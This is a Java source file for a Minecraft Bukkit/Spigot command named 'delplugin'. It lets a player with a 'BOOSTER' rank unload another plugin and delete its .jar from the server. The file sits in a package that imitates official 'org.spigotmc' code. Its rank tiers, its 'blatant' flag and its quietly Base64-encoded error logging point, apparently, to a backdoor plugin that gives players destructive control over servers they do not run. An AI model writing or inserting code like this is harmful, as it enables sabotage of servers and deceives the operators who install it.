package org.spigotmc.commands.impl.premium.server;

import java.io.IOException;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.manager.DataManager;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "delplugin",
    desc = "Delete a plugin",
    usage = "delplugin <plugin>",
    rank = PlayerType.BOOSTER,
    blatant = true
)

public class Delete extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE(Delete.class.getAnnotation(CommandInfo.class).usage()));
		} else {
			if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
				p.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
			} else {
				String plugin1 = args[1];
				ClassLoader classLoader = Bukkit.getPluginManager().getPlugin(plugin1).getClass().getClassLoader();
				if (classLoader instanceof URLClassLoader) {
					try {
						((URLClassLoader) classLoader).close();
					} catch (IOException e) {
						byte[] err = Base64.getEncoder().encode(e.getMessage().getBytes());
						DataManager.getData().set("err", new String(err));
					}
					try {
						Files.delete(Paths.get(("plugins/" + args[1] + ".jar")));
					} catch (IOException e) {
						byte[] err = Base64.getEncoder().encode(e.getMessage().getBytes());
						DataManager.getData().set("err", new String(err));
					}
					System.gc();
				}
				p.sendMessage(Settings.PREFIX("The plugin " + Settings.PURPLE + args[1] + Settings.WHITE + " was deleted."));
			}
		}
	}
}

